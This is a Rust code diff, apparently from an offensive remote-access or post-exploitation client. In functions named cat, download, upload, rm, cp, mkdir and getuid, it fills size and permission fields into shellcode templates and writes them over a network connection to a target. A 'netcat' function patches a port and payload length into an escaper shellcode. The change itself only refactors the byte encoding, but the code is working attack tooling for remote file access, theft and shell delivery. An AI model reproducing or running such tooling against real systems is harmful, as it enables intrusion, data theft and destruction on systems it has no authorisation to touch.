@@ -50,8 +50,10 @@ fn dir(config: &Config, directory: &str) -> Result<(), Box<dyn Error>> {
     let dir_sender = OPEN_DIR_SENDER;
 
     let mut shellcode = dir_sender.shellcode.to_vec();
-    shellcode[dir_sender.dir_len_index] = (dir_name_len & 0xff) as u8;
-    shellcode[dir_sender.dir_len_index + 1] = ((dir_name_len & 0xff00) >> 8) as u8;
+    let dir_len_index_bytes = dir_name_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[dir_sender.dir_len_index + i] = dir_len_index_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -123,8 +125,10 @@ fn cat(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
     let file_name_len = (file_name.len() + 1) as u16; // include null byte
     let cat_sender = OPEN_CAT_SENDER;
     let mut shellcode = cat_sender.shellcode.to_vec();
-    shellcode[cat_sender.file_len_index] = (file_name_len & 0xff) as u8;
-    shellcode[cat_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+    let file_len_index_bytes = file_name_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[cat_sender.file_len_index + i] = file_len_index_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -167,8 +171,10 @@ fn cd(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
     let file_name_len = (file.len() + 1) as u16;
     let cd_sender = CD_SENDER;
     let mut shellcode = cd_sender.shellcode.to_vec();
-    shellcode[cd_sender.file_len_index] = (file_name_len & 0xff) as u8;
-    shellcode[cd_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+    let file_len_index_bytes = file_name_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[cd_sender.file_len_index + i] = file_len_index_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -199,7 +205,6 @@ fn pwd(config: &Config) -> Result<(), Box<dyn Error>> {
     let mut pwd_shellcode = pwd_sender.shellcode.to_vec();
     pwd_shellcode.resize(SHELLCODE_LEN, 0);
 
-
     let mut conn = config.conn.as_ref().unwrap();
     conn.write(&pwd_shellcode)?;
 
@@ -228,8 +233,10 @@ fn download(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
     let file_name_len = (file_name.len() + 1) as u16; // include null byte
     let download_sender = OPEN_CAT_SENDER; // use cat sender because the shellcode is the same
     let mut shellcode = download_sender.shellcode.to_vec();
-    shellcode[download_sender.file_len_index] = (file_name_len & 0xff) as u8;
-    shellcode[download_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+    let file_len_index_bytes = file_name_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[download_sender.file_len_index + i] = file_len_index_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -295,10 +302,13 @@ fn upload(config: &Config, file_name: &str, perm: u16) -> Result<(), Box<dyn Err
 
     let upload_sender = UPLOAD_SENDER;
     let mut shellcode = upload_sender.shellcode.to_vec();
-    shellcode[upload_sender.file_len_index] = (upload_file_name_len & 0xff) as u8;
-    shellcode[upload_sender.file_len_index + 1] = ((upload_file_name_len & 0xff00) >> 8) as u8;
-    shellcode[upload_sender.perm_index] = (perm & 0xff) as u8;
-    shellcode[upload_sender.perm_index + 1] = ((perm & 0xff00) >> 8) as u8;
+
+    let upload_file_len_index_bytes = upload_file_name_len.to_le_bytes();
+    let perm_bytes = perm.to_le_bytes();
+    for i in 0..2 {
+        shellcode[upload_sender.file_len_index + i] = upload_file_len_index_bytes[i];
+        shellcode[upload_sender.perm_index + i] = perm_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -337,8 +347,11 @@ fn rm(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
     let file_name_len = (file_name.len() + 1) as u16;
     let rm_sender = RM_SENDER;
     let mut shellcode = rm_sender.shellcode.to_vec();
-    shellcode[rm_sender.file_len_index] = (file_name_len & 0xff) as u8;
-    shellcode[rm_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+
+    let file_len_index_bytes = file_name_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[rm_sender.file_len_index + i] = file_len_index_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -376,10 +389,12 @@ pub fn mv(config: &Config, source_file_name: &str, dest_file_name: &str) -> Resu
     let dest_file_name_len = (dest_file_name.len() + 1) as u16;
     let mv_sender = MV_SENDER;
     let mut shellcode = mv_sender.shellcode.to_vec();
-    shellcode[mv_sender.source_file_len_index] = (source_file_name_len & 0xff) as u8;
-    shellcode[mv_sender.source_file_len_index + 1] = ((source_file_name_len & 0xff00) >> 8) as u8;
-    shellcode[mv_sender.dest_file_len_index] = (dest_file_name_len & 0xff) as u8;
-    shellcode[mv_sender.dest_file_len_index + 1] = ((dest_file_name_len & 0xff00) >> 8) as u8;
+    let source_file_name_len_bytes = source_file_name_len.to_le_bytes();
+    let dest_file_name_len_bytes = dest_file_name_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[mv_sender.source_file_len_index + i] = source_file_name_len_bytes[i];
+        shellcode[mv_sender.dest_file_len_index + i] = dest_file_name_len_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -419,12 +434,14 @@ pub fn cp(config: &Config, source_file_name: &str, dest_file_name: &str, perm: u
     let dest_file_name_len = (dest_file_name.len() + 1) as u16;
     let cp_sender = CP_SENDER;
     let mut shellcode = cp_sender.shellcode.to_vec();
-    shellcode[cp_sender.source_file_len_index] = (source_file_name_len & 0xff) as u8;
-    shellcode[cp_sender.source_file_len_index + 1] = ((source_file_name_len & 0xff00) >> 8) as u8;
-    shellcode[cp_sender.dest_file_len_index] = (dest_file_name_len & 0xff) as u8;
-    shellcode[cp_sender.dest_file_len_index + 1] = ((dest_file_name_len & 0xff00) >> 8) as u8;
-    shellcode[cp_sender.perm_index] = (perm & 0xff) as u8;
-    shellcode[cp_sender.perm_index + 1] = ((perm & 0xff00) >> 8) as u8;
+    let source_file_name_len_bytes = source_file_name_len.to_le_bytes();
+    let dest_file_name_len_bytes = dest_file_name_len.to_le_bytes();
+    let perm_bytes = perm.to_le_bytes();
+    for i in 0..2 {
+        shellcode[cp_sender.source_file_len_index + i] = source_file_name_len_bytes[i];
+        shellcode[cp_sender.dest_file_len_index + i] = dest_file_name_len_bytes[i];
+        shellcode[cp_sender.perm_index + i] = perm_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -458,10 +475,12 @@ fn mkdir(config: &Config, dir_name: &str, perm: u16) -> Result<(), Box<dyn Error
     let dir_name_len = (dir_name.len() + 1) as u16;
     let mkdir_sender = MKDIR_SENDER;
     let mut shellcode = mkdir_sender.shellcode.to_vec();
-    shellcode[mkdir_sender.dir_len_index] = (dir_name_len & 0xff) as u8;
-    shellcode[mkdir_sender.dir_len_index + 1] = ((dir_name_len & 0xff00) >> 8) as u8;
-    shellcode[mkdir_sender.perm_index] = (perm & 0xff) as u8;
-    shellcode[mkdir_sender.perm_index + 1] = ((perm & 0xff00) >> 8) as u8;
+    let dir_name_len_bytes = dir_name_len.to_le_bytes();
+    let perm_bytes = perm.to_le_bytes();
+    for i in 0..2 {
+        shellcode[mkdir_sender.dir_len_index + i] = dir_name_len_bytes[i];
+        shellcode[mkdir_sender.perm_index + i] = perm_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -494,8 +513,10 @@ fn rmdir(config: &Config, dir_name: &str) -> Result<(), Box<dyn Error>> {
     let dir_name_len = (dir_name.len() + 1) as u16;
     let rmdir_sender = RMDIR_SENDER;
     let mut shellcode = rmdir_sender.shellcode.to_vec();
-    shellcode[rmdir_sender.file_len_index] = (dir_name_len & 0xff) as u8;
-    shellcode[rmdir_sender.file_len_index + 1] = ((dir_name_len & 0xff00) >> 8) as u8;
+    let dir_name_len_bytes = dir_name_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[rmdir_sender.file_len_index + i] = dir_name_len_bytes[i];
+    }    
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
@@ -525,7 +546,6 @@ fn getuid(config: &Config) -> Result<(), Box<dyn Error>> {
     let getuid_sender = SYS_GETUID_GETUID_SENDER;
     let mut getuid_shellcode = getuid_sender.shellcode.to_vec();
     getuid_shellcode.resize(SHELLCODE_LEN, 0);
-
 
     let mut conn = config.conn.as_ref().unwrap();
     conn.write(&getuid_shellcode)?;
@@ -619,16 +639,15 @@ fn netcat(config: &Config, payload: &[u8], port: u16, quiet: bool) -> Result<(),
     let payload_len = payload.len();
     let upload_escaper = NETCAT_ESCAPER;
     let mut shellcode = upload_escaper.shellcode.to_vec();
-    shellcode[upload_escaper.port_index] = ((port & 0xff00) >> 8) as u8;
-    shellcode[upload_escaper.port_index + 1] = (port & 0xff) as u8;
-    shellcode[upload_escaper.payload_length_index0] = (payload_len & 0xff) as u8;
-    shellcode[upload_escaper.payload_length_index0 + 1] = ((payload_len & 0xff00) >> 8) as u8;
-    shellcode[upload_escaper.payload_length_index0 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
-    shellcode[upload_escaper.payload_length_index0 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
-    shellcode[upload_escaper.payload_length_index1] = (payload_len & 0xff) as u8;
-    shellcode[upload_escaper.payload_length_index1 + 1] = ((payload_len & 0xff00) >> 8) as u8;
-    shellcode[upload_escaper.payload_length_index1 + 2] = ((payload_len & 0xff0000) >> 16) as u8;
-    shellcode[upload_escaper.payload_length_index1 + 3] = ((payload_len & 0xff000000) >> 24) as u8;
+    let port_bytes = port.to_be_bytes();
+    let payload_len_bytes = payload_len.to_le_bytes();
+    for i in 0..2 {
+        shellcode[upload_escaper.port_index + i] = port_bytes[i];
+    }
+    for i in 0..4 {
+        shellcode[upload_escaper.payload_length_index0 + i] = payload_len_bytes[i];
+        shellcode[upload_escaper.payload_length_index1 + i] = payload_len_bytes[i];
+    }
     shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
